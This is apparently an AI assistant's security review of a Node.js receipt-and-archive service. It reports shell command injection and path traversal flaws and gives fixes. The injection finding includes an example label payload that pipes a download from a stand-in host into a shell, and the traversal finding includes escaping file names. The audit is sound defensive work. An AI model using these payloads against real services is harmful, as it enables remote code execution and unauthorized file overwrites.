I found two exploitable flaws in the shipping path, plus several smaller issues. I only read the code and ran nothing. The launch manifest loads `config/base.json` and then `config/shipping.json`. So the live setup is `routes/shipping.mjs`, listening on `0.0.0.0:8418`, with the synthetic token.

## High severity

**1. Shell command injection in receipt rendering** (`src/render/process.mjs:8`)
- The code builds a shell string and passes it to `exec`:
  `program + ' "%s" "' + label + '" > "' + output + '"'`
- `receiptLabel` (`src/validation.mjs:13-17`) only checks length and rejects `\r` and `\n`. It lets through `"`, `` ` ``, `$(...)`, `;`, `&`, and `|`.
- A label such as `x"; curl evil|sh; echo "` or `$(id)` runs arbitrary commands as the service account.
- This breaks the README's promise that the operator credential doesn't grant a shell or arbitrary host access. The README's claim that the label is "printable shipping information" is not enforced.
- Fix:
  - Use `execFile(program, ['%s', label])`, or `spawn` with no shell.
  - Write the output with `fs.createWriteStream` or by capturing stdout.
  - Better still, drop the external process and render the text in JS.

**2. Path traversal in archive unpack** (`src/storage/files.mjs:7`)
- `join(directory, entry.name)` is never checked to stay inside the workspace. `decodeEntries` only checks type and length (160 characters at most).
- A name like `../../receipts/foo.txt` or `../other-ws/x` writes outside the workspace root. It can overwrite any file the service account can write, including other workspaces' files and the receipt output.
- This contradicts "not authorized to write outside the workspace root". The "no symlinks" assumption doesn't help, because `..` needs no symlink.
- Fix:
  - Resolve the destination.
  - Require `resolved.startsWith(directory + sep)`.
  - Reject absolute names, `..` segments, and NUL bytes.
  - Ideally also check with `realpath`.

Together these two let a holder of the shared token run code and modify files. The token is a static synthetic string, committed in `config/base.json`.

## Medium severity

- **Bound to all interfaces.** `config/shipping.json` sets `listen: 0.0.0.0`, but the README says the service is for a private network. The base value of `127.0.0.1` is overridden. There is no TLS, so the bearer token travels in cleartext unless a proxy sits in front. Bind to loopback or a specific private interface.
- **Weak credential handling.**
  - The token is hardcoded in the repo, and the code never checks that it was replaced.
  - The comparison at `src/identity.mjs:2` is not constant-time. Use `crypto.timingSafeEqual` on hashes.
  - There is no rate limiting or lockout.
- **Error messages are not generic.** `src/server.mjs:13` returns `error.message` directly. That leaks `JSON.parse` details and internal `TypeError` text, which contradicts the README's "generic JSON error body". Unknown errors also return 400 instead of 500.
- **Dynamic import of a config value.** `src/server.mjs:5` runs `import(configuration.routeModule)`. `loadConfiguration` only checks `startsWith('./routes/')`, and `./routes/../x` passes. It is trusted config today, but you should allowlist the module names.

## Low severity

- **Robustness in `decodeEntries`.** A `null` entry throws a `TypeError`. Content length is counted in characters, not bytes. `readBody` concatenates chunks as strings, which can corrupt multibyte characters split across chunks, and it measures size only after buffering each chunk. There is no request timeout or concurrency limit.
- **Route matching uses `request.url`.** A query string, such as `/receipts/render?x=1`, gives a 404. There is no method check, so any HTTP verb works.
- **Role check is a no-op.** `authenticate` always returns the `operator` role, so `requireOperator` can never fail. This is harmless now but is misleading.
- **Dead and legacy code.** `archive/legacy-server.mjs`, `routes/compatibility.mjs`, and `config/development.json` are shipped in the package. I didn't review them. The `dist/launch-manifest.json` file only matters if it matches the real config.
- **Tests.** I didn't read the tests, and the README says they aren't evidence of a passing run. Add tests for `..` entry names and for shell metacharacters in labels.

I can draft the patches for the two high-severity issues, which are small and self-contained, if you'd like.
